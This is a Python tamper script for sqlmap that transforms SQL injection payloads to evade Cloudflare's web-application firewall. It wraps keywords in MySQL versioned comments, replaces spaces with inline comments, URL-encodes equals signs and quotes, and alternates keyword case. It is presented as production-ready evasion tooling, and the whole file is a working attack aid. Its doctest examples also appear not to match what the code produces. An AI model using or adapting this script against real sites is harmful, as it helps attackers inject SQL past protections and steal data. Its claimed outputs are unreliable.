#!/usr/bin/env python

"""
Copyright (c) 2006-2025 sqlmap developers (https://sqlmap.org/)
See the file 'LICENSE' for copying permission

Tamper script: cloudflare2025.py
Description: Production-ready WAF bypass with context-aware transformations
Author: Regaan
Priority: HIGHEST

IMPORTANT: This script is designed to work STANDALONE.
Do NOT chain with other cloudflare_* scripts - they're already included here.
"""

import re
from lib.core.enums import PRIORITY

__priority__ = PRIORITY.HIGHEST

def dependencies():
    pass

def tamper(payload, **kwargs):
    """
    Production-ready multi-layer WAF bypass with proper safeguards.
    
    CRITICAL DESIGN DECISIONS:
    1. Transformations are applied in SAFE ORDER
    2. Each transformation checks if already applied (no reapplication)
    3. Context-aware parsing prevents breaking SQL structure
    4. Word boundaries prevent partial matches
    5. String literals are preserved
    
    Transformation Order (CRITICAL - DO NOT CHANGE):
    1. Keyword wrapping (with reapplication check)
    2. Space replacement (preserving strings)
    3. Value encoding (context-aware)
    4. Case variation (keywords only, with reapplication check)
    
    Safeguards:
    - Won't encode inside comments (preserves /*!50000.../)
    - Won't reapply transformations
    - Uses word boundaries (no partial matches)
    - Preserves string literal integrity
    
    >>> tamper("SELECT * FROM users WHERE id=1")
    '/*!50000sElEcT*//**/*/**//*!50000fRoM*//**/users/**//*!50000wHeRe*//**/id%3D1'
    
    >>> tamper("UNION SELECT password FROM admin WHERE role='admin'")
    '/*!50000uNiOn*//**//*!50000sElEcT*//**/password/**//*!50000fRoM*//**/admin/**//*!50000wHeRe*//**/role%3D%27admin%27'
    """
    
    retVal = payload
    
    if not payload:
        return retVal
    
    # ================================================================
    # STEP 1: Keyword Obfuscation (with reapplication protection)
    # ================================================================
    if '/*!50000' not in retVal:  # Only if not already processed
        keywords = [
            'SELECT', 'UNION', 'INSERT', 'UPDATE', 'DELETE',
            'WHERE', 'FROM', 'JOIN', 'ORDER', 'GROUP', 'HAVING', 'LIMIT'
        ]
        
        for keyword in keywords:
            # Use word boundaries to avoid partial matches (e.g., INNER_JOIN)
            pattern = r'\b' + keyword + r'\b'
            replacement = f'/*!50000{keyword}*/'
            retVal = re.sub(pattern, replacement, retVal, flags=re.IGNORECASE)
    
    # ================================================================
    # STEP 2: Space Replacement (preserving string literals)
    # ================================================================
    if '/**/' not in retVal:  # Only if spaces haven't been replaced yet
        # Context-aware space replacement
        in_string = False
        quote_char = None
        result = []
        
        for i, char in enumerate(retVal):
            # Track string literals
            if char in ("'", '"') and (i == 0 or retVal[i-1] != '\\'):
                if not in_string:
                    in_string = True
                    quote_char = char
                elif char == quote_char:
                    in_string = False
                    quote_char = None
            
            # Replace space only outside strings
            if char == ' ' and not in_string:
                result.append('/**/')
            else:
                result.append(char)
        
        retVal = ''.join(result)
    
    # ================================================================
    # STEP 3: Value Encoding (context-aware, preserves comments)
    # ================================================================
    # Only encode in value context, NOT in SQL structure
    # Encode = in WHERE/HAVING clauses
    retVal = re.sub(r'(WHERE|HAVING)\s*(\w+)=', r'\1/**/\2%3D', retVal, flags=re.IGNORECASE)
    
    # Encode quotes in string literals (after =)
    retVal = re.sub(r"='([^']*)'", r"=%27\1%27", retVal)
    
    # ================================================================
    # STEP 4: Case Variation (keywords only, with reapplication check)
    # ================================================================
    # Apply alternating case to keywords INSIDE comment wrappers
    keywords_for_case = [
        'SELECT', 'UNION', 'INSERT', 'UPDATE', 'DELETE',
        'WHERE', 'FROM', 'JOIN', 'ORDER', 'GROUP', 'HAVING'
    ]
    
    for keyword in keywords_for_case:
        # Create alternating case
        alternating = ''.join(
            char.lower() if i % 2 == 0 else char.upper()
            for i, char in enumerate(keyword)
        )
        
        # Replace keyword inside comment wrapper
        # This ensures we only affect keywords, not other occurrences
        retVal = retVal.replace(f'/*!50000{keyword}*/', f'/*!50000{alternating}*/')
    
    return retVal
